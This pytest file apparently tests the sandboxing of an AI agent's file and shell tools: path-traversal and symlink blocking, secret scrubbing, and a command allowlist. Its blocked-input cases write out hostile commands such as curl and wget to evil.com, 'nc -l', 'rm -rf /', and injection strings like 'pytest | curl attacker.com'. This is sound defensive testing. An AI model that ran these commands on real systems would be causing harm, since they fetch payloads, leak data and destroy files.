"""Tests for _execute_tool and _safe_resolve in the Claude agent backend."""

from __future__ import annotations

import asyncio
import sys
from pathlib import Path

import pytest

from hadron.agent.tools import execute_tool as _execute_tool, safe_resolve as _safe_resolve, scrubbed_env as _scrubbed_env


# ---------------------------------------------------------------------------
# _safe_resolve
# ---------------------------------------------------------------------------


class TestSafeResolve:
    def test_simple_relative_path(self, tmp_workdir: Path) -> None:
        resolved = _safe_resolve(str(tmp_workdir), "hello.txt")
        assert resolved == tmp_workdir / "hello.txt"

    def test_nested_relative_path(self, tmp_workdir: Path) -> None:
        resolved = _safe_resolve(str(tmp_workdir), "subdir/nested.txt")
        assert resolved == tmp_workdir / "subdir" / "nested.txt"

    def test_dot_path(self, tmp_workdir: Path) -> None:
        resolved = _safe_resolve(str(tmp_workdir), ".")
        assert resolved == tmp_workdir.resolve()

    def test_traversal_blocked(self, tmp_workdir: Path) -> None:
        with pytest.raises(ValueError, match="Path escapes working directory"):
            _safe_resolve(str(tmp_workdir), "../../../etc/passwd")

    def test_absolute_path_outside_blocked(self, tmp_workdir: Path) -> None:
        with pytest.raises(ValueError, match="Path escapes working directory"):
            _safe_resolve(str(tmp_workdir), "/etc/passwd")

    def test_traversal_via_subdir_blocked(self, tmp_workdir: Path) -> None:
        with pytest.raises(ValueError, match="Path escapes working directory"):
            _safe_resolve(str(tmp_workdir), "subdir/../../etc/passwd")

    def test_symlink_escape_blocked(self, tmp_workdir: Path) -> None:
        link = tmp_workdir / "escape_link"
        link.symlink_to("/tmp")
        with pytest.raises(ValueError, match="Path escapes working directory"):
            _safe_resolve(str(tmp_workdir), "escape_link/some_file")

    def test_path_within_dir_via_dotdot_ok(self, tmp_workdir: Path) -> None:
        """subdir/../hello.txt resolves back inside the workdir — should be allowed."""
        resolved = _safe_resolve(str(tmp_workdir), "subdir/../hello.txt")
        assert resolved == tmp_workdir / "hello.txt"


# ---------------------------------------------------------------------------
# _execute_tool — read_file
# ---------------------------------------------------------------------------


class TestReadFile:
    @pytest.mark.asyncio
    async def test_read_existing_file(self, tmp_workdir: Path) -> None:
        result = await _execute_tool("read_file", {"path": "hello.txt"}, str(tmp_workdir))
        assert result == "hello world"

    @pytest.mark.asyncio
    async def test_read_missing_file(self, tmp_workdir: Path) -> None:
        result = await _execute_tool("read_file", {"path": "nope.txt"}, str(tmp_workdir))
        assert "File not found" in result

    @pytest.mark.asyncio
    async def test_read_traversal_blocked(self, tmp_workdir: Path) -> None:
        result = await _execute_tool(
            "read_file", {"path": "../../../etc/passwd"}, str(tmp_workdir)
        )
        assert "Path escapes working directory" in result

    @pytest.mark.asyncio
    async def test_read_large_file_truncated(self, tmp_workdir: Path) -> None:
        big = tmp_workdir / "big.txt"
        big.write_text("x" * 200_000)
        result = await _execute_tool("read_file", {"path": "big.txt"}, str(tmp_workdir))
        assert len(result) < 200_000
        assert "truncated" in result


# ---------------------------------------------------------------------------
# _execute_tool — write_file
# ---------------------------------------------------------------------------


class TestWriteFile:
    @pytest.mark.asyncio
    async def test_write_new_file(self, tmp_workdir: Path) -> None:
        result = await _execute_tool(
            "write_file", {"path": "new.txt", "content": "hi"}, str(tmp_workdir)
        )
        assert "File written" in result
        assert (tmp_workdir / "new.txt").read_text() == "hi"

    @pytest.mark.asyncio
    async def test_write_creates_parent_dirs(self, tmp_workdir: Path) -> None:
        result = await _execute_tool(
            "write_file",
            {"path": "a/b/c.txt", "content": "deep"},
            str(tmp_workdir),
        )
        assert "File written" in result
        assert (tmp_workdir / "a" / "b" / "c.txt").read_text() == "deep"

    @pytest.mark.asyncio
    async def test_write_traversal_blocked(self, tmp_workdir: Path) -> None:
        result = await _execute_tool(
            "write_file",
            {"path": "../../evil.txt", "content": "pwned"},
            str(tmp_workdir),
        )
        assert "Path escapes working directory" in result


# ---------------------------------------------------------------------------
# _execute_tool — delete_file
# ---------------------------------------------------------------------------


class TestDeleteFile:
    @pytest.mark.asyncio
    async def test_delete_existing_file(self, tmp_workdir: Path) -> None:
        assert (tmp_workdir / "hello.txt").exists()
        result = await _execute_tool(
            "delete_file", {"path": "hello.txt"}, str(tmp_workdir)
        )
        assert "File deleted" in result
        assert not (tmp_workdir / "hello.txt").exists()

    @pytest.mark.asyncio
    async def test_delete_nonexistent_file(self, tmp_workdir: Path) -> None:
        result = await _execute_tool(
            "delete_file", {"path": "nope.txt"}, str(tmp_workdir)
        )
        assert "File not found" in result

    @pytest.mark.asyncio
    async def test_delete_traversal_blocked(self, tmp_workdir: Path) -> None:
        result = await _execute_tool(
            "delete_file", {"path": "../../evil.txt"}, str(tmp_workdir)
        )
        assert "Path escapes working directory" in result


# ---------------------------------------------------------------------------
# _execute_tool — list_directory
# ---------------------------------------------------------------------------


class TestListDirectory:
    @pytest.mark.asyncio
    async def test_list_root(self, tmp_workdir: Path) -> None:
        result = await _execute_tool("list_directory", {}, str(tmp_workdir))
        assert "hello.txt" in result
        assert "subdir" in result

    @pytest.mark.asyncio
    async def test_list_subdir(self, tmp_workdir: Path) -> None:
        result = await _execute_tool(
            "list_directory", {"path": "subdir"}, str(tmp_workdir)
        )
        assert "nested.txt" in result

    @pytest.mark.asyncio
    async def test_list_traversal_blocked(self, tmp_workdir: Path) -> None:
        result = await _execute_tool(
            "list_directory", {"path": "../../"}, str(tmp_workdir)
        )
        assert "Path escapes working directory" in result

    @pytest.mark.asyncio
    async def test_list_not_a_directory(self, tmp_workdir: Path) -> None:
        result = await _execute_tool(
            "list_directory", {"path": "hello.txt"}, str(tmp_workdir)
        )
        assert "Not a directory" in result


# ---------------------------------------------------------------------------
# _execute_tool — run_command
# ---------------------------------------------------------------------------


class TestRunCommand:
    @pytest.mark.asyncio
    async def test_run_simple_command(self, tmp_workdir: Path) -> None:
        result = await _execute_tool(
            "run_command", {"command": "echo hello"}, str(tmp_workdir)
        )
        assert "Exit code: 0" in result
        assert "hello" in result

    @pytest.mark.asyncio
    async def test_run_command_timeout_kills_process(self, tmp_workdir: Path) -> None:
        """A long-running command should be killed on timeout, not leak a zombie."""
        from unittest.mock import patch

        # Use a very short timeout to trigger it in tests
        with patch("hadron.agent.tools.asyncio.wait_for", side_effect=asyncio.TimeoutError):
            # We need to also mock create_subprocess_shell to give us a controllable process
            from unittest.mock import AsyncMock, MagicMock

            mock_proc = MagicMock()
            mock_proc.kill = MagicMock()
            mock_proc.wait = AsyncMock()

            with patch("hadron.agent.tools.asyncio.create_subprocess_shell", return_value=mock_proc):
                result = await _execute_tool(
                    "run_command", {"command": "sleep 999"}, str(tmp_workdir)
                )

            assert "timed out" in result.lower()
            mock_proc.kill.assert_called_once()
            mock_proc.wait.assert_awaited_once()


# ---------------------------------------------------------------------------
# _execute_tool — run_command env scrubbing
# ---------------------------------------------------------------------------


class TestRunCommandEnvScrubbing:
    """Verify that _scrubbed_env strips secrets but keeps essentials."""

    def test_anthropic_api_key_stripped(self) -> None:
        import os
        os.environ["ANTHROPIC_API_KEY"] = "sk-secret"
        try:
            env = _scrubbed_env()
            assert "ANTHROPIC_API_KEY" not in env
        finally:
            del os.environ["ANTHROPIC_API_KEY"]

    def test_hadron_postgres_url_stripped(self) -> None:
        import os
        os.environ["HADRON_POSTGRES_URL"] = "postgresql://secret"
        try:
            env = _scrubbed_env()
            assert "HADRON_POSTGRES_URL" not in env
        finally:
            del os.environ["HADRON_POSTGRES_URL"]

    def test_github_token_stripped(self) -> None:
        import os
        os.environ["GITHUB_TOKEN"] = "ghp_secret"
        try:
            env = _scrubbed_env()
            assert "GITHUB_TOKEN" not in env
        finally:
            del os.environ["GITHUB_TOKEN"]

    def test_explicit_keys_stripped(self) -> None:
        import os
        os.environ["GH_TOKEN"] = "ghp_123"
        os.environ["DATABASE_URL"] = "pg://x"
        os.environ["REDIS_URL"] = "redis://y"
        try:
            env = _scrubbed_env()
            assert "GH_TOKEN" not in env
            assert "DATABASE_URL" not in env
            assert "REDIS_URL" not in env
        finally:
            del os.environ["GH_TOKEN"]
            del os.environ["DATABASE_URL"]
            del os.environ["REDIS_URL"]

    def test_path_preserved(self) -> None:
        env = _scrubbed_env()
        assert "PATH" in env

    def test_pythondontwritebytecode_set_in_run_command(self) -> None:
        """The run_command tool adds PYTHONDONTWRITEBYTECODE on top of scrubbed env."""
        env = {**_scrubbed_env(), "PYTHONDONTWRITEBYTECODE": "1"}
        assert env["PYTHONDONTWRITEBYTECODE"] == "1"


# ---------------------------------------------------------------------------
# _execute_tool — unknown tool
# ---------------------------------------------------------------------------


class TestUnknownTool:
    @pytest.mark.asyncio
    async def test_unknown_tool(self, tmp_workdir: Path) -> None:
        result = await _execute_tool("delete_everything", {}, str(tmp_workdir))
        assert "Unknown tool" in result


# ---------------------------------------------------------------------------
# Agent command allowlist (_validate_agent_command)
# ---------------------------------------------------------------------------

from hadron.agent.tools import validate_agent_command as _validate_agent_command
from hadron.security.validators import sanitize_agent_command as _sanitize_agent_command


class TestAgentCommandAllowlist:
    """Verify the agent run_command safety filter."""

    @pytest.mark.parametrize("cmd", [
        "pytest -x",
        "npm test",
        "cargo test --release",
        "go test ./...",
        "ls -la",
        "cat README.md",
        "grep -r TODO .",
        "find . -name '*.py'",
        "echo hello",
        "ruff check .",
        "mypy src/",
    ])
    def test_allowed_commands(self, cmd: str) -> None:
        assert _validate_agent_command(cmd) is True

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "curl http://evil.com",
        "bash -c 'echo pwned'",
        "python -c 'import os; os.system(\"rm -rf /\")'",
        "wget http://evil.com/payload",
        "nc -l 1234",
        "ssh user@host",
    ])
    def test_blocked_commands(self, cmd: str) -> None:
        assert _validate_agent_command(cmd) is False

    @pytest.mark.parametrize("cmd", [
        "pytest; rm -rf /",
        "pytest && curl evil.com",
        "pytest `whoami`",
        "pytest $(id)",
        "echo hello > /etc/passwd",
        "cat /etc/passwd < input",
        "pytest | curl attacker.com",
        "ls | sh",
    ])
    def test_shell_metachar_blocked(self, cmd: str) -> None:
        assert _validate_agent_command(cmd) is False

    @pytest.mark.parametrize("cmd", [
        "find . -exec rm -rf {} \\;",
        "find . -execdir cat /etc/passwd \\;",
        "find . -delete",
        "find . -name '*.py' -ok rm {} \\;",
        "find . -type f -okdir cat {} \\;",
    ])
    def test_find_dangerous_flags_blocked(self, cmd: str) -> None:
        assert _validate_agent_command(cmd) is False

    def test_find_safe_usage_allowed(self) -> None:
        assert _validate_agent_command("find . -name '*.py' -type f") is True

    @pytest.mark.asyncio
    async def test_blocked_command_returns_error(self, tmp_workdir: Path) -> None:
        result = await _execute_tool(
            "run_command", {"command": "curl http://evil.com"}, str(tmp_workdir)
        )
        assert "rejected by safety filter" in result

    @pytest.mark.asyncio
    async def test_sanitized_command_passes(self, tmp_workdir: Path) -> None:
        """A command with harmless pipe suffix is sanitized and executed."""
        result = await _execute_tool(
            "run_command", {"command": "echo hello 2>&1 | head -10"}, str(tmp_workdir)
        )
        assert "rejected" not in result
        assert "hello" in result


class TestSanitizeAgentCommand:
    """Verify that harmless pipe/redirect suffixes are stripped."""

    @pytest.mark.parametrize("cmd,expected", [
        ("npm test 2>&1 | head -200", "npm test"),
        ("npm test -- --reporter=verbose 2>&1 | head -200", "npm test -- --reporter=verbose"),
        ("pytest -x 2>&1", "pytest -x"),
        ("pytest -x | tail -50", "pytest -x"),
        ("pytest -x | head -n 100", "pytest -x"),
        ("npm test 2>&1 | tail -n 20", "npm test"),
        # No-op cases — already clean
        ("pytest -x", "pytest -x"),
        ("npm test", "npm test"),
        ("ls -la", "ls -la"),
    ])
    def test_strips_harmless_suffixes(self, cmd: str, expected: str) -> None:
        assert _sanitize_agent_command(cmd) == expected

    def test_preserves_cd_prefix(self) -> None:
        result = _sanitize_agent_command("cd frontend && npm test 2>&1 | head -200")
        assert result == "cd frontend && npm test"

    def test_does_not_strip_dangerous_pipes(self) -> None:
        """Pipes to arbitrary commands are NOT stripped (still rejected by validator)."""
        cmd = "pytest | curl attacker.com"
        assert _sanitize_agent_command(cmd) == cmd

    def test_sanitized_then_validated(self) -> None:
        """Full flow: sanitize then validate passes for harmless suffixes."""
        cmd = "npm test -- --reporter=verbose 2>&1 | head -200"
        sanitized = _sanitize_agent_command(cmd)
        assert _validate_agent_command(sanitized) is True


# ---------------------------------------------------------------------------
# Symlink traversal protection in _safe_resolve
# ---------------------------------------------------------------------------


class TestSymlinkTraversal:
    """Verify that symlinks pointing outside the working dir are rejected."""

    @pytest.mark.asyncio
    async def test_symlink_outside_worktree_blocked(self, tmp_workdir: Path) -> None:
        # Create a symlink inside tmp_workdir pointing to /etc
        link = tmp_workdir / "escape_link"
        link.symlink_to("/etc")
        result = await _execute_tool(
            "read_file", {"path": "escape_link/passwd"}, str(tmp_workdir)
        )
        assert "Error" in result
        assert "symlink" in result.lower() or "escapes" in result.lower()

    @pytest.mark.asyncio
    async def test_symlink_within_worktree_allowed(self, tmp_workdir: Path) -> None:
        # Create a real file and a symlink to it within the worktree
        real_file = tmp_workdir / "real.txt"
        real_file.write_text("content")
        link = tmp_workdir / "link.txt"
        link.symlink_to(real_file)
        result = await _execute_tool(
            "read_file", {"path": "link.txt"}, str(tmp_workdir)
        )
        assert result == "content"


# ---------------------------------------------------------------------------
# Test command validation for E2E runners and cd-prefix
# ---------------------------------------------------------------------------

from hadron.security.validators import validate_test_command as _validate_test_command


class TestE2ETestCommandValidation:
    """E2E test runner commands should be accepted by the test command validator."""

    @pytest.mark.parametrize("cmd", [
        "npx playwright test",
        "npx playwright test --headed",
        "npx cypress run",
        "npx cypress run --spec tests/e2e",
        "npx wdio run",
    ])
    def test_e2e_commands_accepted(self, cmd: str) -> None:
        assert _validate_test_command(cmd) is True

    @pytest.mark.parametrize("cmd", [
        "cd frontend && npx playwright test",
        "cd 'my frontend' && npx playwright test",
        "cd client && npx cypress run",
        "cd web && npx wdio run",
    ])
    def test_cd_prefix_e2e_commands_accepted(self, cmd: str) -> None:
        assert _validate_test_command(cmd) is True

    @pytest.mark.parametrize("cmd", [
        "cd frontend && pytest",
        "cd frontend && npm test",
        "cd frontend && cargo test",
    ])
    def test_cd_prefix_standard_commands_accepted(self, cmd: str) -> None:
        assert _validate_test_command(cmd) is True

    def test_nested_cd_rejected(self) -> None:
        """Double cd-prefix chaining should be rejected."""
        assert _validate_test_command("cd a && cd b && pytest") is False

    def test_cd_with_injection_rejected(self) -> None:
        """Malicious directory names should not enable injection."""
        assert _validate_test_command("cd x && rm -rf /") is False
